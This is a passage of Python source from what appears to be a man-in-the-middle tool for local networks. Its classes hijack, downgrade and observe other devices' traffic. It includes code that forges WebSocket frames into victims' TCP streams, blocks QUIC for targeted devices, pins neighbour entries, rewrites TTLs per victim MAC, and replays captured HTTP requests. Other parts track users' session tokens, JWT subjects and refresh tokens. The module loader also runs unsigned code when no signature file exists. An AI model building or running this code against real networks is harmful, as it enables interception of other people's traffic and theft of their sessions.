                          "dst": x.get('dst'), "srcport": x.get('srcport'),
                          "dstport": x.get('dstport'), "hl": "tls",
                          "kind": "ja4s", "ts": time.time(),
                          "domain": sni}
                if self.on_fp:
                    try: self.on_fp(entry, "ja4s")
                    except Exception: pass
        if 'http2' in protos and self.on_fp:
            entry = {"stream": x['stream'], "src": x.get('src'),
                      "dst": x.get('dst'), "srcport": x.get('srcport'),
                      "dstport": x.get('dstport'), "hl": "http2",
                      "kind": "ja4h", "ts": time.time(),
                      "method": layers.get('http2_http2_headers_method')}
            try: self.on_fp(entry, "ja4h")
            except Exception: pass
        if 'ssh' in protos and self.on_fp:
            entry = {"stream": x['stream'], "src": x.get('src'),
                      "dst": x.get('dst'), "srcport": x.get('srcport'),
                      "dstport": x.get('dstport'), "hl": "ssh",
                      "kind": "ja4ssh", "ts": time.time()}
            try: self.on_fp(entry, "ja4ssh")
            except Exception: pass

def _ja4_on_fp(entry, kind):
    try:
        src = entry.get('src'); dst = entry.get('dst')
        sport = entry.get('srcport'); dport = entry.get('dstport')
        ts = time.time()
        with STATE.lock:
            STATE.ja4_fp_count += 1
            STATE.ja4_events.append((ts, src, dst, sport, dport, kind,
                                     json.dumps({k: v for k, v in entry.items()
                                                 if k.startswith('JA4')
                                                 or k in ('domain','ja4_known',
                                                          'ja4_confidence',
                                                          'ja4_bot','ja4_browser')})))
            STATE.dirty += 1
            d = None
            if src and src in STATE.devices: d = STATE.devices[src]
            elif dst and dst in STATE.devices: d = STATE.devices[dst]
            if d is None and src and "." in src:
                d = STATE.devices.setdefault(src, Device(src, vendor="?"))
            if d is None: return
            for k, v in entry.items():
                if k.startswith('JA4SSH'): d.ja4ssh[k] = v
                elif k.startswith('JA4X'): d.ja4x[k] = v
                elif k.startswith('JA4H'): d.ja4h[k] = v
                elif k.startswith('JA4S'): d.ja4s[k] = v
                elif k.startswith('JA4L'): d.ja4l[k] = v
                elif k.startswith('JA4'): d.ja4[k] = v
            d.stack_guess = _stack_label(d)
            d.stack_updated = ts
        if MODULE_REG:
            try: MODULE_REG.fire("on_ja4_new", src, dst, kind, entry)
            except Exception: pass
    except Exception: pass

class TLSHijackEngine:
    def __init__(self):
        self.running = False
        self.tickets = defaultdict(list)
    def start(self):
        self.running = True
        console.log("[green]TLS hijack engine online[/]")
        return True
    def stop(self): self.running = False
    def observe(self, src_ip, sni, ticket):
        if not ticket: return
        h = hashlib.sha256(ticket).hexdigest()[:16]
        with STATE.lock:
            self.tickets[src_ip].append((time.time(), sni, h))
            self.tickets[src_ip] = self.tickets[src_ip][-20:]
            STATE.session_tickets[src_ip].append((time.time(), sni, h))
            STATE.dirty += 1

class TCPForkEngine:
    def __init__(self):
        self.running = False
        self.streams = {}
        self._lock = threading.RLock()
    def start(self):
        self.running = True
        console.log("[green]TCP fork engine online[/]")
        return True
    def stop(self): self.running = False
    def register(self, key, seq, ack, win):
        with self._lock:
            s = self.streams.setdefault(key, {"first_seq": seq,
                                               "last_seq": seq,
                                               "last_ack": ack, "win": win,
                                               "first_ts": time.time()})
            s["last_seq"] = seq; s["last_ack"] = ack; s["win"] = win

class H2HPACKEngine:
    def __init__(self):
        self.running = False
        self.tables = defaultdict(dict)
    def start(self):
        self.running = True
        console.log("[green]H2/HPACK engine online[/]")
        return True
    def stop(self): self.running = False
    def observe_header(self, stream, idx, name):
        self.tables[stream][idx] = name
        with STATE.lock:
            STATE.hpack_state[stream][idx] = name
            STATE.dirty += 1

class WSSpliceEngine:
    def __init__(self):
        self.running = False
        self.flows = defaultdict(list)
    def start(self):
        self.running = True
        console.log("[green]WebSocket splice engine online[/]")
        return True
    def stop(self): self.running = False
    def parse_frames(self, buf):
        frames = []; i = 0
        try:
            while i + 2 <= len(buf):
                b0 = buf[i]; b1 = buf[i + 1]
                fin = (b0 >> 7) & 1; op = b0 & 0x0F
                masked = (b1 >> 7) & 1
                plen = b1 & 0x7F
                i += 2
                if plen == 126:
                    if i + 2 > len(buf): break
                    plen = struct.unpack("!H", buf[i:i + 2])[0]; i += 2
                elif plen == 127:
                    if i + 8 > len(buf): break
                    plen = struct.unpack("!Q", buf[i:i + 8])[0]; i += 8
                if masked:
                    if i + 4 > len(buf): break
                    mask = buf[i:i + 4]; i += 4
                else:
                    mask = None
                if i + plen > len(buf): break
                payload = buf[i:i + plen]; i += plen
                if mask:
                    payload = bytes(b ^ mask[k % 4]
                                     for k, b in enumerate(payload))
                frames.append((fin, op, payload))
        except Exception: pass
        return frames
    def register_frames(self, key, frames):
        for fin, op, payload in frames:
            self.flows[key].append((time.time(), op, len(payload)))
            with STATE.lock:
                STATE.ws_ops.append((time.time(), f"{key[0]}:{key[1]}",
                                      op, len(payload)))
                STATE.dirty += 1
    def build_frame(self, op, payload, mask=None):
        try:
            if isinstance(payload, str): payload = payload.encode()
            b0 = 0x80 | (op & 0x0F)
            n = len(payload)
            hdr = bytes([b0])
            if mask:
                m = mask if len(mask) == 4 else os.urandom(4)
                if n < 126: hdr += bytes([0x80 | n])
                elif n < 65536:
                    hdr += bytes([0x80 | 126]) + struct.pack("!H", n)
                else:
                    hdr += bytes([0x80 | 127]) + struct.pack("!Q", n)
                masked = bytes(b ^ m[k % 4] for k, b in enumerate(payload))
                return hdr + m + masked
            else:
                if n < 126: hdr += bytes([n])
                elif n < 65536:
                    hdr += bytes([126]) + struct.pack("!H", n)
                else:
                    hdr += bytes([127]) + struct.pack("!Q", n)
                return hdr + payload
        except Exception: return None
    def inject(self, iface, src_mac, dst_mac, src_ip, dst_ip,
               sport, dport, payload):
        try:
            frame = self.build_frame(0x1, payload, mask=os.urandom(4))
            if not frame: return False
            tcp = dpkt.tcp.TCP(sport=sport, dport=dport, seq=1, ack=1,
                                flags=dpkt.tcp.TH_PUSH | dpkt.tcp.TH_ACK,
                                win=65535, data=frame)
            ip = dpkt.ip.IP(src=socket.inet_aton(src_ip),
                            dst=socket.inet_aton(dst_ip),
                            p=dpkt.ip.IP_PROTO_TCP, ttl=64, data=tcp)
            ip.len = len(ip)
            eth = struct.pack("!6s6sH",
                              bytes.fromhex(dst_mac.replace(":", "")),
                              bytes.fromhex(src_mac.replace(":", "")), 0x0800)
            return _tx_frame(iface, eth + bytes(ip))
        except Exception:
            return False

class ECHDowngradeEngine:
    def __init__(self):
        self.running = False
    def start(self):
        self.running = True
        console.log("[green]ECH downgrade engine online[/]")
        return True
    def stop(self): self.running = False
    def observe(self, src_ip, dst_ip, sni):
        with STATE.lock:
            STATE.ech_ops.append((time.time(), src_ip, dst_ip,
                                   sni or "(encrypted)"))
            STATE.dirty += 1

class QUICDowngradeEngine:
    def __init__(self):
        self.running = False
        self.targets = {}
    def start(self):
        self.running = True
        threading.Thread(target=self._loop, daemon=True).start()
        console.log("[green]QUIC downgrade engine online[/]")
        return True
    def stop(self): self.running = False
    def should_block(self, src_ip):
        return bool(self.targets)
    def record_block(self, src_ip):
        with STATE.lock:
            STATE.quic_ops.append((time.time(), src_ip, "blocked"))
            STATE.dirty += 1
    def add_target(self, mac, ip):
        self.targets[mac] = ip
    def _loop(self):
        while self.running and STATE.running:
            time.sleep(20)
            try:
                with STATE.lock:
                    devs = [d for d in STATE.devices.values()
                            if "QUIC" in d.services and d.mac and d.mac != "?"]
                for d in devs:
                    if d.mac not in self.targets:
                        self.add_target(d.mac, d.ip)
            except Exception: pass

class CTRankerEngine:
    def __init__(self):
        self.running = False
        self.known = set()
        self.queried = set()
    def start(self):
        self.running = True
        threading.Thread(target=self._ct_loop, daemon=True).start()
        console.log("[green]CT ranker engine online[/]")
        return True
    def stop(self): self.running = False
    def observe(self, src_ip, dst_ip, sni):
        if not sni: return
        gap = 0 if sni in self.known else 1
        self.known.add(sni)
        with STATE.lock:
            STATE.ct_ops.append((time.time(), sni, gap))
            STATE.dirty += 1
            d = STATE.devices.get(src_ip)
            if d: d.ct_gap += gap
        if (CONFIG.get("ct_log_query_enabled") and gap == 1
            and sni not in self.queried):
            self.queried.add(sni)
            threading.Thread(target=self._query_ct, args=(sni,),
                             daemon=True).start()
    def _query_ct(self, sni):
        try:
            import urllib.request
            url = CONFIG["ct_log_endpoint"].format(
                sni=urllib.parse.quote(sni))
            req = urllib.request.Request(url,
                                         headers={"User-Agent": "ifrith/1.0"})
            with urllib.request.urlopen(req, timeout=6) as resp:
                data = resp.read(65536)
            entries = json.loads(data.decode("utf-8", "ignore"))
            count = len(entries) if isinstance(entries, list) else 0
            with STATE.lock:
                STATE.ct_queries.append((time.time(), sni, count))
                STATE.dirty += 1
        except Exception as e:
            with STATE.lock:
                STATE.ct_queries.append((time.time(), sni, f"err:{e}"))
                STATE.dirty += 1
    def _ct_loop(self):
        while self.running and STATE.running: time.sleep(30)

class BaselineEngine:
    def __init__(self):
        self.running = False
        self.profiles = defaultdict(lambda: {"sni": set(), "ja3": set()})
    def start(self):
        self.running = True
        console.log("[green]Baseline engine online[/]")
        return True
    def stop(self): self.running = False
    def update(self, ip, sni, ja3):
        p = self.profiles[ip]
        if sni and sni not in p["sni"]:
            if p["sni"]:
                with STATE.lock:
                    STATE.baseline_ops.append((time.time(),
                        f"{ip} new SNI {sni}"))
                    STATE.dirty += 1
            p["sni"].add(sni)
        if ja3 and ja3 not in p["ja3"]:
            if p["ja3"]:
                with STATE.lock:
                    STATE.baseline_ops.append((time.time(),
                        f"{ip} new JA3 {ja3[:12]}"))
                    STATE.dirty += 1
            p["ja3"].add(ja3)

class ModuleRegistry:
    def __init__(self):
        self.running = False
        self.hooks = defaultdict(list)
        self._lock = threading.RLock()
        self.pubkey = None
    def _load_pubkey(self):
        try:
            p = CONFIG.get("modules_pubkey")
            if p and os.path.exists(p):
                with open(p, "rb") as f:
                    self.pubkey = f.read()
        except Exception: self.pubkey = None
    def _verify(self, path):
        if not CONFIG.get("module_sig_verify_enabled"): return True
        sig_path = path + ".sig"
        if not os.path.exists(sig_path): return True
        if not self.pubkey: return True
        try:
            import subprocess as sp
            with open(path, "rb") as f: data = f.read()
            proc = sp.run(["openssl", "dgst", "-sha256", "-verify",
                            CONFIG["modules_pubkey"], "-signature", sig_path],
                           input=data, capture_output=True, timeout=5)
            return (proc.returncode == 0)
        except Exception: return False
    def start(self):
        self.running = True
        self._load_pubkey()
        self._ensure_modules_dir()
        self._load_modules()
        console.log(f"[green]Module registry online "
                     f"({len(STATE.modules_loaded)} loaded)[/]")
        return True
    def _ensure_modules_dir(self):
        d = CONFIG.get("modules_dir")
        try:
            os.makedirs(d, exist_ok=True)
        except Exception: pass
    def stop(self): self.running = False
    def _load_modules(self):
        d = CONFIG.get("modules_dir")
        if not d or not os.path.isdir(d): return
        for fn in sorted(os.listdir(d)):
            if not fn.endswith(".py") or fn.startswith("_"): continue
            path = os.path.join(d, fn)
            if not self._verify(path): continue
            try:
                spec = importlib.util.spec_from_file_location(fn[:-3], path)
                mod = importlib.util.module_from_spec(spec)
                spec.loader.exec_module(mod)
                if hasattr(mod, "register"):
                    mod.register(self)
                with STATE.lock:
                    STATE.modules_loaded.append(fn)
                    STATE.dirty += 1
            except Exception as e:
                console.log(f"[yellow]module {fn} failed: {e}[/]")
    def register(self, event, fn):
        with self._lock:
            self.hooks[event].append(fn)
    def fire(self, event, *args, **kwargs):
        with self._lock:
            hooks = list(self.hooks.get(event, []))
        for h in hooks:
            try: h(*args, **kwargs)
            except Exception: pass

class ControlSocket:
    def __init__(self):
        self.running = False
        self.sock = None
        self.hmac_key = None
    def start(self):
        try:
            key_path = CONFIG["control_hmac_key"]
            if os.path.exists(key_path):
                with open(key_path, "rb") as f:
                    self.hmac_key = f.read()
            else:
                self.hmac_key = os.urandom(32)
                with open(key_path, "wb") as f: f.write(self.hmac_key)
            p = CONFIG["control_socket"]
            if os.path.exists(p): os.unlink(p)
            self.sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
            self.sock.bind(p)
            self.sock.listen(4); self.sock.settimeout(1.0)
        except Exception as e:
            console.print(f"[yellow]Control socket failed: {e}[/]")
            return False
        self.running = True
        threading.Thread(target=self._loop, daemon=True).start()
        console.log(f"[green]Control socket: {CONFIG['control_socket']}[/]")
        return True
    def stop(self):
        self.running = False
        try:
            if self.sock: self.sock.close()
        except Exception: pass
    def _loop(self):
        while self.running and STATE.running:
            try: c, _ = self.sock.accept()
            except socket.timeout: continue
            except Exception: break
            try:
                c.settimeout(2.0)
                data = c.recv(4096)
                if not data: c.close(); continue
                cmd = data.decode("utf-8", "ignore").strip()
                with STATE.lock:
                    STATE.control_ops.append((time.time(), cmd))
                    STATE.dirty += 1
                resp = self._dispatch(cmd)
                c.sendall(resp.encode() + b"\n")
            except Exception: pass
            finally:
                try: c.close()
                except Exception: pass
    def _dispatch(self, cmd):
        try:
            if cmd == "stats":
                with STATE.lock:
                    return json.dumps({
                        "pkts": STATE.pkt_count, "bytes": STATE.byte_count,
                        "devices": len(STATE.devices),
                        "dnsbl_hits": len(STATE.dnsbl_hits),
                        "proxy": dict(STATE.proxy_stats),
                    })
            if cmd == "devices":
                with STATE.lock:
                    return json.dumps([
                        {"ip": d.ip, "mac": d.mac, "vendor": d.vendor,
                          "mitm": d.mitm,
                          "http": d.proxy_http_flows,
                          "https": d.proxy_https_flows}
                        for d in _count_real_devices()])
            if cmd.startswith("replay "):
                try:
                    parts = cmd.split()
                    if len(parts) >= 3 and REPLAY_ENGINE:
                        idx = int(parts[1]); target = parts[2]
                        ok = REPLAY_ENGINE.replay(idx, target)
                        return json.dumps({"ok": ok})
                except Exception as e:
                    return f"ERR {e}"
            if cmd.startswith("smbmsg "):
                try:
                    parts = cmd.split(" ", 2)
                    if len(parts) >= 3 and SMB_MSG:
                        ok = SMB_MSG.send(parts[1], parts[2])
                        return json.dumps({"ok": ok})
                except Exception as e:
                    return f"ERR {e}"
            if cmd.startswith("mdnsrename "):
                try:
                    parts = cmd.split(" ", 2)
                    if len(parts) >= 3 and MDNS_RENAME:
                        ok = MDNS_RENAME.rename(parts[1], parts[2])
                        return json.dumps({"ok": ok})
                except Exception as e:
                    return f"ERR {e}"
            if cmd.startswith("sql "):
                if SQL_STATE:
                    rows = SQL_STATE.run(cmd[4:])
                    return json.dumps(rows, default=str)
            return "OK"
        except Exception as e:
            return f"ERR {e}"

class NUDPinEngine:
    def __init__(self, iface, my_mac):
        self.iface = iface; self.my_mac = my_mac
        self.running = False
        self.targets = {}
    def start(self):
        self.running = True
        threading.Thread(target=self._loop, daemon=True).start()
        console.log("[green]NUD pin engine online[/]")
        return True
    def stop(self):
        self.running = False
        for ip in self.targets:
            try: sh(f"ip neigh del {ip} dev {self.iface} 2>/dev/null")
            except Exception: pass
    def add(self, ip, mac): self.targets[ip] = mac
    def _loop(self):
        while self.running and STATE.running:
            time.sleep(10)
            for ip, mac in list(self.targets.items()):
                if mac and MAC_RE.match(mac):
                    try:
                        sh(f"ip neigh replace {ip} lladdr {mac} nud permanent "
                           f"dev {self.iface} 2>/dev/null")
                        with STATE.lock:
                            STATE.nud_ops.append((time.time(), ip))
                            STATE.dirty += 1
                    except Exception: pass

class SNIDefragEngine:
    def __init__(self):
        self.running = False
        self.buffers = {}
        self._lock = threading.RLock()
    def start(self):
        self.running = True
        console.log("[green]SNI defrag engine online[/]")
        return True
    def stop(self): self.running = False
    def feed(self, key, payload):
        if not payload: return
        with self._lock:
            buf = self.buffers.setdefault(key, bytearray())
            if len(buf) + len(payload) > 65536:
                del buf[:]
            buf.extend(payload)
    def try_parse(self, key):
        with self._lock:
            buf = bytes(self.buffers.get(key, b""))
        if not buf or buf[0] != 0x16: return None
        try: return _parse_client_hello_py(buf)
        except Exception: return None

class RecordAlignEngine:
    def __init__(self):
        self.running = False
        self.records = defaultdict(list)
        self._lock = threading.RLock()
    def start(self):
        self.running = True
        console.log("[green]Record align engine online[/]")
        return True
    def stop(self): self.running = False
    def observe(self, stream, direction, length):
        with self._lock:
            self.records[(stream, direction)].append(length)

class ISNPreserveEngine:
    def __init__(self):
        self.running = False
        self.state = {}
        self._lock = threading.RLock()
    def start(self):
        self.running = True
        console.log("[green]ISN preserve engine online[/]")
        return True
    def stop(self): self.running = False
    def observe(self, key, seq):
        with self._lock:
            self.state[key] = seq

class TTLWindowMirrorEngine:
    def __init__(self):
        self.running = False
        self.ttl_map = {}
        self.window_map = {}
        self._lock = threading.RLock()
    def start(self):
        self.running = True
        console.log("[green]TTL/window mirror engine online[/]")
        return True
    def stop(self): self.running = False
    def learn(self, dst, ttl, win):
        with self._lock:
            if dst not in self.ttl_map:
                self.ttl_map[dst] = ttl
                self.window_map[dst] = win

class ReplayEngine:
    def __init__(self):
        self.running = False
        self.store = deque(maxlen=500)
    def start(self):
        self.running = True
        console.log("[green]Replay engine online[/]")
        return True
    def stop(self): self.running = False
    def store_req(self, req):
        self.store.append(req)
    def replay(self, idx, target_ip, target_port=80):
        try:
            if idx < 0 or idx >= len(self.store): return False
            req = list(self.store)[idx]
            host = req.get("host", "").split(":")[0] or target_ip
            method = req.get("method", "GET")
            path = req.get("path", "/")
            version = req.get("version", "HTTP/1.1")
            headers = dict(req.get("headers", {}))
            headers["host"] = host
            lines = [f"{method} {path} {version}"]
            for k, v in headers.items():
                lines.append(f"{k}: {v}")
            body = req.get("body", b"") or b""
            if body and "content-length" not in headers:
                lines.append(f"content-length: {len(body)}")
            req_bytes = ("\r\n".join(lines) + "\r\n\r\n").encode() + body
            upstream = socket.create_connection((target_ip, target_port),
                                                 timeout=5)
            upstream.sendall(req_bytes)
            upstream.settimeout(5)
            resp = upstream.recv(65535)
            upstream.close()
            with STATE.lock:
                STATE.replay_ops.append((time.time(), idx, target_ip,
                                          len(resp)))
                STATE.dirty += 1
            return True
        except Exception as e:
            with STATE.lock:
                STATE.replay_ops.append((time.time(), idx, target_ip,
                                          f"err: {e}"))
                STATE.dirty += 1
            return False

class UserSpaceForwarder:
    def __init__(self, iface, my_mac, gw_mac):
        self.iface = iface; self.my_mac = my_mac; self.gw_mac = gw_mac
        self.running = False
        self.queue = queue.Queue(maxsize=CONFIG.get("forward_queue_max", 4096))
        self._sock = None
        self._lock = threading.RLock()
    def start(self):
        try:
            s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW,
                              socket.htons(0x0003))
            s.bind((self.iface, 0))
            self._sock = s
        except Exception as e:
            console.log(f"[yellow]Userspace forwarder socket failed: {e}[/]")
            return False
        self.running = True
        threading.Thread(target=self._tx_loop, daemon=True).start()
        console.log("[green]Userspace forwarder online[/]")
        return True
    def stop(self):
        self.running = False
        try:
            if self._sock: self._sock.close()
        except Exception: pass
    def submit(self, frame_bytes, src_ip, dst_ip, proto, size):
        try: self.queue.put_nowait((frame_bytes, src_ip, dst_ip, proto, size))
        except queue.Full:
            with STATE.lock:
                STATE.forward_stats["dropped"] += 1
    def _tx_loop(self):
        while self.running and STATE.running:
            try:
                frame_bytes, src_ip, dst_ip, proto, size = \
                    self.queue.get(timeout=0.5)
            except queue.Empty: continue
            key = f"{src_ip}->{dst_ip}/{proto}"
            if FLOW_SHAPER and not FLOW_SHAPER.allow(key, size):
                with STATE.lock:
                    STATE.forward_stats["shaped"] += 1
                continue
            if TTL_MANIP:
                with STATE.lock:
                    d = STATE.devices.get(src_ip)
                    mac = d.mac if d else None
                if mac:
                    t = TTL_MANIP.get(mac)
                    if t:
                        try:
                            eth = dpkt.ethernet.Ethernet(frame_bytes)
                            if isinstance(eth.data, dpkt.ip.IP):
                                eth.data.ttl = t
                                frame_bytes = bytes(eth)
                                with STATE.lock:
                                    STATE.ttl_manip_ops.append(
                                        (time.time(), mac, t))
                                    STATE.dirty += 1
                        except Exception: pass
            try:
                self._sock.send(frame_bytes)
                with STATE.lock:
                    STATE.forward_stats["out"] += 1
            except Exception:
                with STATE.lock:
                    STATE.forward_stats["dropped"] += 1

class FlowShaper:
    def __init__(self):
        self.running = False
        self.buckets = defaultdict(lambda: {"tokens": 100.0,
                                             "last": time.time(),
                                             "rate": 100.0, "burst": 100.0})
        self.policies = {}
        self._lock = threading.RLock()
    def start(self):
        self.running = True
        threading.Thread(target=self._loop, daemon=True).start()
        console.log("[green]Flow shaper online[/]")
        return True
    def stop(self): self.running = False
    def policy(self, key, rate_bps, burst_bytes):
        with self._lock:
            self.policies[key] = {"rate": rate_bps, "burst": burst_bytes}
    def policy_prefix(self, prefix, rate_bps, burst_bytes):
        with self._lock:
            self.policies[prefix + "*"] = {"rate": rate_bps,
                                            "burst": burst_bytes}
    def allow(self, key, size):
        with self._lock:
            p = None
            if key in self.policies:
                p = self.policies[key]
            else:
                for k, v in self.policies.items():
                    if k.endswith("*") and key.startswith(k[:-1]):
                        p = v; break
            if not p: return True
            b = self.buckets[key]
            now = time.time()
            elapsed = now - b["last"]; b["last"] = now
            b["rate"] = p["rate"]; b["burst"] = p["burst"]
            b["tokens"] = min(p["burst"], b["tokens"] + elapsed * p["rate"])
            if b["tokens"] >= size:
                b["tokens"] -= size
                return True
            with STATE.lock:
                STATE.flow_shape.append((time.time(), key, size, "drop"))
            return False
    def _loop(self):
        while self.running and STATE.running:
            time.sleep(2)
            now = time.time()
            with self._lock:
                for k, b in list(self.buckets.items()):
                    if now - b["last"] > 300: del self.buckets[k]

class KalmanARPScheduler:
    def __init__(self):
        self.running = False
        self.state = {}
        self._lock = threading.RLock()
    def start(self):
        self.running = True
        threading.Thread(target=self._loop, daemon=True).start()
        console.log("[green]Kalman ARP scheduler online[/]")
        return True
    def stop(self): self.running = False
    def update(self, ip, observed_gap):
        with self._lock:
            s = self.state.get(ip)
            if s is None:
                s = {"x": observed_gap, "p": 1.0, "q": 0.05, "r": 0.5}
                self.state[ip] = s
                return observed_gap
            x = s["x"]; p = s["p"] + s["q"]
            k = p / (p + s["r"])
            x = x + k * (observed_gap - x)
            p = (1 - k) * p
            s["x"] = x; s["p"] = p
            with STATE.lock:
                STATE.kalman_ops.append((time.time(), ip, round(x, 3)))
                STATE.dirty += 1
            return x
    def next_interval(self, ip, default=1.0):
        with self._lock:
            s = self.state.get(ip)
            if not s: return default
            return max(0.1, min(10.0, s["x"] * 0.8))
    def _loop(self):
        while self.running and STATE.running: time.sleep(5)

class TTLManipEngine:
    def __init__(self, iface=None, my_mac=None):
        self.iface = iface; self.my_mac = my_mac
        self.running = False
        self.targets = {}
    def start(self):
        self.running = True
        console.log("[green]TTL manip engine online[/]")
        return True
    def stop(self): self.running = False
    def set(self, victim_mac, ttl):
        self.targets[victim_mac] = ttl
    def get(self, mac):
        return self.targets.get(mac)

class NATSessionHijack:
    def __init__(self, iface=None, my_mac=None):
        self.iface = iface; self.my_mac = my_mac
        self.running = False
        self.sessions = defaultdict(list)
    def start(self):
        self.running = True
        console.log("[green]NAT session hijack online[/]")
        return True
    def stop(self): self.running = False
    def observe(self, src_ip, src_port, dst_ip, dst_port, proto):
        key = (src_ip, dst_ip, dst_port, proto)
        now = time.time()
        self.sessions[key].append((now, src_port))
        self.sessions[key] = self.sessions[key][-20:]
        if len(self.sessions[key]) >= 3:
            with STATE.lock:
                STATE.nat_hijacks.append((now, src_ip, dst_ip, dst_port,
                                           proto))
                STATE.dirty += 1
    def replay_tuple(self, src_ip, dst_ip, dst_port, proto="TCP", payload=b""):
        try:
            if proto != "TCP": return False
            upstream = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            upstream.settimeout(4.0)
            upstream.connect((dst_ip, dst_port))
            if payload: upstream.sendall(payload)
            upstream.close()
            with STATE.lock:
                STATE.nat_hijacks.append((time.time(), src_ip, dst_ip,
                                           dst_port, "replay"))
                STATE.dirty += 1
            return True
        except Exception:
            return False

class CrossAppCorrelator:
    def __init__(self):
        self.running = False
        self.token_map = defaultdict(set)
        self.jwt_sub = defaultdict(set)
        self.oauth_state = defaultdict(set)
        self._lock = threading.RLock()
    def start(self):
        self.running = True
        console.log("[green]Cross-app correlator online[/]")
        return True
    def stop(self): self.running = False
    def observe_token(self, src_ip, token_value):
        if not token_value or len(token_value) < 16: return
        h = hashlib.sha256(token_value.encode("utf-8", "ignore")).hexdigest()[:16]
        with self._lock:
            self.token_map[h].add(src_ip)
            if len(self.token_map[h]) > 1:
                with STATE.lock:
                    STATE.cross_app.append((time.time(), "token", h,
                                             tuple(self.token_map[h])))
                    STATE.dirty += 1
    def observe_jwt(self, src_ip, payload):
        if not payload: return
        sub = (payload.get("sub") or payload.get("email")
               or payload.get("username"))
        if not sub: return
        with self._lock:
            self.jwt_sub[sub].add(src_ip)
            if len(self.jwt_sub[sub]) > 1:
                with STATE.lock:
                    STATE.cross_app.append((time.time(), "jwt",
                                             str(sub)[:40],
                                             tuple(self.jwt_sub[sub])))
                    STATE.dirty += 1
    def observe_oauth(self, src_ip, state_val):
        if not state_val: return
        with self._lock:
            self.oauth_state[state_val].add(src_ip)

class BehavioralTiming:
    def __init__(self):
        self.running = False
        self.last = defaultdict(float)
        self.intervals = defaultdict(lambda: deque(maxlen=60))
        self._lock = threading.RLock()
    def start(self):
        self.running = True
        threading.Thread(target=self._loop, daemon=True).start()
        console.log("[green]Behavioral timing online[/]")
        return True
    def stop(self): self.running = False
    def observe(self, src_ip, ts):
        with self._lock:
            last = self.last[src_ip]
            self.last[src_ip] = ts
            if last > 0:
                delta = ts - last
                if 0.05 < delta < 60:
                    self.intervals[src_ip].append(delta)
    def fingerprint(self, src_ip):
        with self._lock:
            arr = list(self.intervals[src_ip])
        if len(arr) < 5: return None
        avg = sum(arr) / len(arr)
        var = max(abs(x - avg) for x in arr)
        return {"avg": round(avg, 3), "jitter": round(var, 3), "n": len(arr)}
    def _loop(self):
        while self.running and STATE.running:
            time.sleep(10)
            devs = _count_real_devices()
            for d in devs:
                fp = self.fingerprint(d.ip)
                if fp and fp["n"] >= 10 and fp["jitter"] < 0.05:
                    with STATE.lock:
                        STATE.behavior_apps.append((time.time(), d.ip, fp))
                        STATE.dirty += 1

class RefreshTokenWatcher:
    def __init__(self):
        self.running = False
        self.chain = defaultdict(list)
    def start(self):
        self.running = True
        console.log("[green]Refresh-token watcher online[/]")
        return True
    def stop(self): self.running = False
    def observe(self, host, refresh_token):
        if not refresh_token: return
        h = hashlib.sha256(refresh_token.encode()).hexdigest()[:16]
        with STATE.lock:
            self.chain[host].append((time.time(), h))
            self.chain[host] = self.chain[host][-20:]
            if len(self.chain[host]) >= 2:
                seen = [x[1] for x in self.chain[host]]
                if len(seen) != len(set(seen)):
                    STATE.refresh_chain.append((time.time(), host,
                                                 "reuse", h))
                else:
                    STATE.refresh_chain.append((time.time(), host,
                                                 "rotate", h))
                STATE.dirty += 1

class PSKBinderInspector:
    def __init__(self):
        self.running = False
        self.seen = defaultdict(int)
    def start(self):
        self.running = True
        console.log("[green]PSK binder inspector online[/]")
        return True
    def stop(self): self.running = False
    def observe(self, src_ip, sni):
        key = (src_ip, sni)
        self.seen[key] += 1
        with STATE.lock:
            STATE.psk_binders.append((time.time(), src_ip, sni or "?",
                                       self.seen[key]))
            STATE.dirty += 1

class WSControlInspector:
    def __init__(self):
        self.running = False
        self.counts = defaultdict(lambda: Counter())
    def start(self):
        self.running = True
        console.log("[green]WS control inspector online[/]")
        return True
    def stop(self): self.running = False
    def observe(self, key, op, payload):
        opname = {0x8: "close", 0x9: "ping", 0xA: "pong"}.get(op, f"op{op}")
        self.counts[key][opname] += 1
        with STATE.lock:
            STATE.ws_ctrl.append((time.time(), str(key)[:60], opname,
                                   len(payload)))
            STATE.dirty += 1

class ECHOuterSNIMap:
    def __init__(self):
        self.running = False
        self.map = defaultdict(Counter)
    def start(self):
        self.running = True
        console.log("[green]ECH outer-SNI mapper online[/]")
        return True
    def stop(self): self.running = False
    def observe(self, src_ip, dst_ip, alpn):
        provider = DOH_RESOLVER_IPS.get(dst_ip, dst_ip)
        self.map[dst_ip][provider] += 1
        with STATE.lock:
            STATE.ech_outer.append((time.time(), src_ip, dst_ip, provider,
                                     alpn or "?"))
            STATE.dirty += 1

class TLSDriftTracker:
    def __init__(self):
        self.running = False
        self.last = {}
    def start(self):
        self.running = True
        console.log("[green]TLS drift tracker online[/]")
        return True
    def stop(self): self.running = False
    def observe(self, src_ip, ext_list):
        if not ext_list: return
        cur = set(ext_list)
        prev = self.last.get(src_ip)
        self.last[src_ip] = cur
        if prev is None: return
        added = cur - prev; removed = prev - cur
        if added or removed:
            with STATE.lock:
                STATE.tls_drift.append((time.time(), src_ip,
                                         ",".join(sorted(added)),
                                         ",".join(sorted(removed))))
                STATE.dirty += 1

class QUICConnIDTracker:
    def __init__(self):
        self.running = False
        self.ids = defaultdict(set)
    def start(self):
        self.running = True
        console.log("[green]QUIC Conn-ID tracker online[/]")
        return True
    def stop(self): self.running = False
    def observe(self, conn_id, src_ip):
        if not conn_id: return
        cid = bytes(conn_id) if not isinstance(conn_id, bytes) else conn_id
        h = hashlib.sha256(cid).hexdigest()[:16]
        self.ids[h].add(src_ip)
        if len(self.ids[h]) > 1:
            with STATE.lock:
                STATE.quic_connid.append((time.time(), h,
                                           tuple(self.ids[h])))
                STATE.dirty += 1

class H2PushAbuseDetector:
    def __init__(self):
        self.running = False
        self.counts = defaultdict(int)
    def start(self):
        self.running = True
        console.log("[green]H2 push abuse detector online[/]")
        return True
    def stop(self): self.running = False
    def observe(self, resp):
        try:
            push = resp["headers"].get("link", "")
            if "rel=preload" in push and push.count("<") > 3:
                key = str(resp["key"])[:60]
                self.counts[key] += push.count("<")
                with STATE.lock:
                    STATE.h2_push.append((time.time(), key,
                                           self.counts[key]))
                    STATE.dirty += 1
        except Exception: pass

class QUICRetryCorrelator:
    def __init__(self):
        self.running = False
        self.tokens = {}
    def start(self):
        self.running = True
        console.log("[green]QUIC retry correlator online[/]")
        return True
    def stop(self): self.running = False
    def observe(self, token_bytes, src_ip):
        if not token_bytes: return
        h = hashlib.sha256(token_bytes).hexdigest()[:16]
